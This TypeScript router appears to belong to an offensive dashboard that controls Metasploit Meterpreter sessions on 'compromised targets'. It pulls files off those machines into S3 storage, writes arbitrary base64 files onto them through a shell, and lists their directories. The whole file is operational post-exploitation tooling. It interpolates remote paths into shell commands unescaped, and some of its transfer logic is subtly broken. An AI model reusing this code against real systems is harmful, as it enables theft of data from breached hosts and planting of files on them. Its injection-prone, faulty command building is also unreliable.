/**
 * File Transfers Router
 *
 * Manages file upload/download operations between the dashboard and
 * compromised targets via Meterpreter sessions, with S3 storage for artifacts.
 */
import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { protectedProcedure, router } from "../_core/trpc";

export const fileTransfersRouter = router({
  // ─── List Transfers ──────────────────────────────────────────────────────
  listTransfers: protectedProcedure
    .input(z.object({
      serverId: z.number().optional(),
      sessionId: z.string().optional(),
      direction: z.enum(["upload", "download"]).optional(),
      status: z.enum(["pending", "in_progress", "completed", "failed"]).optional(),
      limit: z.number().min(1).max(100).default(50),
    }).optional())
    .query(async ({ input }) => {
      const { fileTransfers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq, and, desc } = await import("drizzle-orm");
      const dbConn = await getDbRequired();

      const conditions: any[] = [];
      if (input?.serverId) conditions.push(eq(fileTransfers.serverId, input.serverId));
      if (input?.sessionId) conditions.push(eq(fileTransfers.sessionId, input.sessionId));
      if (input?.direction) conditions.push(eq(fileTransfers.direction, input.direction));
      if (input?.status) conditions.push(eq(fileTransfers.status, input.status));

      const whereClause = conditions.length > 0 ? and(...conditions) : undefined;

      return dbConn.select().from(fileTransfers)
        .where(whereClause)
        .orderBy(desc(fileTransfers.createdAt))
        .limit(input?.limit || 50);
    }),

  // ─── Get Transfer Detail ─────────────────────────────────────────────────
  getTransfer: protectedProcedure
    .input(z.object({ id: z.number() }))
    .query(async ({ input }) => {
      const { fileTransfers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();

      const [transfer] = await dbConn.select().from(fileTransfers)
        .where(eq(fileTransfers.id, input.id))
        .limit(1);

      if (!transfer) throw new TRPCError({ code: "NOT_FOUND", message: "Transfer not found" });
      return transfer;
    }),

  // ─── Download File from Target ───────────────────────────────────────────
  // Downloads a file from the compromised target via Meterpreter and stores in S3
  downloadFromTarget: protectedProcedure
    .input(z.object({
      serverId: z.number(),
      sessionId: z.string(),
      remotePath: z.string().min(1),
    }))
    .mutation(async ({ input, ctx }) => {
      const { fileTransfers, metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const { MsfClient } = await import("../lib/msf-client");
      const { doStoragePut } = await import("../do-storage");
      const dbConn = await getDbRequired();

      // Extract filename from remote path
      const fileName = input.remotePath.split(/[/\\]/).pop() || "unknown";
      const randomSuffix = Math.random().toString(36).substring(2, 10);

      // Create transfer record
      const [result] = await dbConn.insert(fileTransfers).values({
        serverId: input.serverId,
        sessionId: input.sessionId,
        direction: "download",
        remotePath: input.remotePath,
        fileName,
        status: "in_progress",
        createdBy: ctx.user.openId,
      });
      const transferId = result.insertId;

      // Execute download asynchronously
      (async () => {
        try {
          // Get server and create client
          const [server] = await dbConn.select().from(metasploitServers)
            .where(eq(metasploitServers.id, input.serverId))
            .limit(1);
          if (!server) throw new Error("Server not found");

          const client = await MsfClient.fromServerWithTunnel(server);
          if (!client) throw new Error("Failed to connect to exploit server");

          // Use Meterpreter to read the file
          // First, get file info
          await client.meterpreterWrite(input.sessionId, `cat "${input.remotePath}"`);
          await new Promise(resolve => setTimeout(resolve, 3000));
          const fileContent = await client.meterpreterRead(input.sessionId);

          // For binary files, use download command with base64 encoding
          await client.meterpreterWrite(input.sessionId, `download "${input.remotePath}" /tmp/msf_dl_${randomSuffix}`);
          await new Promise(resolve => setTimeout(resolve, 5000));
          const dlResult = await client.meterpreterRead(input.sessionId);

          // Read the downloaded file via shell
          await client.meterpreterWrite(input.sessionId, `execute -f cat -a "/tmp/msf_dl_${randomSuffix}" -i`);
          await new Promise(resolve => setTimeout(resolve, 2000));

          // Store content in S3
          const fileBuffer = Buffer.from(fileContent || "No content retrieved", "utf-8");
          const s3Key = `msf-artifacts/${ctx.user.openId}/${transferId}-${fileName}-${randomSuffix}`;

          const { url } = await doStoragePut(s3Key, fileBuffer, "application/octet-stream");

          // Update transfer record
          await dbConn.update(fileTransfers)
            .set({
              status: "completed",
              fileSize: fileBuffer.length,
              s3Key,
              s3Url: url,
              completedAt: new Date(),
            })
            .where(eq(fileTransfers.id, transferId));
        } catch (err: any) {
          await dbConn.update(fileTransfers)
            .set({
              status: "failed",
              errorMessage: err.message,
              completedAt: new Date(),
            })
            .where(eq(fileTransfers.id, transferId));
        }
      })();

      return { transferId };
    }),

  // ─── Upload File to Target ───────────────────────────────────────────────
  // Uploads a file from S3 to the compromised target via Meterpreter
  uploadToTarget: protectedProcedure
    .input(z.object({
      serverId: z.number(),
      sessionId: z.string(),
      remotePath: z.string().min(1),
      fileContent: z.string(), // Base64-encoded file content
      fileName: z.string(),
      mimeType: z.string().optional(),
    }))
    .mutation(async ({ input, ctx }) => {
      const { fileTransfers, metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const { MsfClient } = await import("../lib/msf-client");
      const { doStoragePut } = await import("../do-storage");
      const dbConn = await getDbRequired();

      const randomSuffix = Math.random().toString(36).substring(2, 10);
      const fileBuffer = Buffer.from(input.fileContent, "base64");

      // Store in S3 first for audit trail
      const s3Key = `msf-uploads/${ctx.user.openId}/${input.fileName}-${randomSuffix}`;
      const { url: s3Url } = await doStoragePut(s3Key, fileBuffer, input.mimeType || "application/octet-stream");

      // Create transfer record
      const [result] = await dbConn.insert(fileTransfers).values({
        serverId: input.serverId,
        sessionId: input.sessionId,
        direction: "upload",
        remotePath: input.remotePath,
        fileName: input.fileName,
        fileSize: fileBuffer.length,
        mimeType: input.mimeType || null,
        s3Key,
        s3Url,
        status: "in_progress",
        createdBy: ctx.user.openId,
      });
      const transferId = result.insertId;

      // Execute upload asynchronously
      (async () => {
        try {
          const [server] = await dbConn.select().from(metasploitServers)
            .where(eq(metasploitServers.id, input.serverId))
            .limit(1);
          if (!server) throw new Error("Server not found");

          const client = await MsfClient.fromServerWithTunnel(server);
          if (!client) throw new Error("Failed to connect to exploit server");

          // Write file content via Meterpreter
          // For small files, use echo with base64 decode
          const b64Content = input.fileContent;
          const chunkSize = 4096;
          const chunks = Math.ceil(b64Content.length / chunkSize);

          if (chunks <= 1) {
            // Small file - single command
            await client.meterpreterWrite(
              input.sessionId,
              `upload -d "${input.remotePath}" <<< $(echo "${b64Content}" | base64 -d)`
            );
          } else {
            // For larger files, write base64 chunks and decode
            await client.meterpreterWrite(input.sessionId, `shell`);
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Write base64 content in chunks
            for (let i = 0; i < chunks; i++) {
              const chunk = b64Content.substring(i * chunkSize, (i + 1) * chunkSize);
              const op = i === 0 ? ">" : ">>";
              await client.shellWrite(
                input.sessionId,
                `echo -n "${chunk}" ${op} /tmp/msf_upload_${randomSuffix}.b64\n`
              );
              await new Promise(resolve => setTimeout(resolve, 200));
            }

            // Decode and move to target path
            await client.shellWrite(
              input.sessionId,
              `base64 -d /tmp/msf_upload_${randomSuffix}.b64 > "${input.remotePath}" && rm /tmp/msf_upload_${randomSuffix}.b64\n`
            );
            await new Promise(resolve => setTimeout(resolve, 2000));

            // Exit shell back to meterpreter
            await client.shellWrite(input.sessionId, "exit\n");
            await new Promise(resolve => setTimeout(resolve, 500));
          }

          await new Promise(resolve => setTimeout(resolve, 3000));
          const uploadResult = await client.meterpreterRead(input.sessionId);

          // Verify upload
          await client.meterpreterWrite(input.sessionId, `ls "${input.remotePath}"`);
          await new Promise(resolve => setTimeout(resolve, 1000));
          const verifyResult = await client.meterpreterRead(input.sessionId);

          await dbConn.update(fileTransfers)
            .set({
              status: "completed",
              completedAt: new Date(),
            })
            .where(eq(fileTransfers.id, transferId));
        } catch (err: any) {
          await dbConn.update(fileTransfers)
            .set({
              status: "failed",
              errorMessage: err.message,
              completedAt: new Date(),
            })
            .where(eq(fileTransfers.id, transferId));
        }
      })();

      return { transferId, s3Url };
    }),

  // ─── Get Download URL ────────────────────────────────────────────────────
  getDownloadUrl: protectedProcedure
    .input(z.object({ transferId: z.number() }))
    .query(async ({ input }) => {
      const { fileTransfers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();

      const [transfer] = await dbConn.select().from(fileTransfers)
        .where(eq(fileTransfers.id, input.transferId))
        .limit(1);

      if (!transfer) throw new TRPCError({ code: "NOT_FOUND", message: "Transfer not found" });
      if (!transfer.s3Url) throw new TRPCError({ code: "NOT_FOUND", message: "File not available" });

      return { url: transfer.s3Url, fileName: transfer.fileName };
    }),

  // ─── Delete Transfer Record ──────────────────────────────────────────────
  deleteTransfer: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ input }) => {
      const { fileTransfers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();

      await dbConn.delete(fileTransfers).where(eq(fileTransfers.id, input.id));
      return { deleted: true };
    }),

  // ─── Browse Remote Directory ─────────────────────────────────────────────
  browseRemoteDir: protectedProcedure
    .input(z.object({
      serverId: z.number(),
      sessionId: z.string(),
      path: z.string().default("."),
    }))
    .mutation(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const { MsfClient } = await import("../lib/msf-client");
      const dbConn = await getDbRequired();

      const [server] = await dbConn.select().from(metasploitServers)
        .where(eq(metasploitServers.id, input.serverId))
        .limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND", message: "Server not found" });

      const client = await MsfClient.fromServerWithTunnel(server);
      if (!client) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Failed to connect" });

      // List directory via Meterpreter
      await client.meterpreterWrite(input.sessionId, `ls "${input.path}"`);
      await new Promise(resolve => setTimeout(resolve, 2000));
      const output = await client.meterpreterRead(input.sessionId);

      // Parse ls output into structured entries
      const lines = output.split("\n").filter((l: string) => l.trim());
      const entries: Array<{
        name: string;
        type: "file" | "directory";
        size: string;
        modified: string;
      }> = [];

      for (const line of lines) {
        // Meterpreter ls format: Mode  Size  Type  Last modified  Name
        const match = line.match(/^(\S+)\s+(\d+)\s+(fil|dir)\s+(.+?)\s{2,}(.+)$/);
        if (match) {
          entries.push({
            name: match[5].trim(),
            type: match[3] === "dir" ? "directory" : "file",
            size: match[2],
            modified: match[4].trim(),
          });
        }
      }

      return {
        path: input.path,
        entries,
        rawOutput: output,
      };
    }),

  // ─── Transfer Stats ──────────────────────────────────────────────────────
  getStats: protectedProcedure.query(async () => {
    const { fileTransfers } = await import("../../drizzle/schema");
    const { getDbRequired } = await import("../db");
    const { eq, count, sql } = await import("drizzle-orm");
    const dbConn = await getDbRequired();

    const [stats] = await dbConn.select({
      total: count(),
      uploads: count(sql`CASE WHEN ${fileTransfers.direction} = 'upload' THEN 1 END`),
      downloads: count(sql`CASE WHEN ${fileTransfers.direction} = 'download' THEN 1 END`),
      completed: count(sql`CASE WHEN ${fileTransfers.status} = 'completed' THEN 1 END`),
      failed: count(sql`CASE WHEN ${fileTransfers.status} = 'failed' THEN 1 END`),
      totalSize: sql<number>`COALESCE(SUM(${fileTransfers.fileSize}), 0)`,
    }).from(fileTransfers);

    return stats;
  }),
});
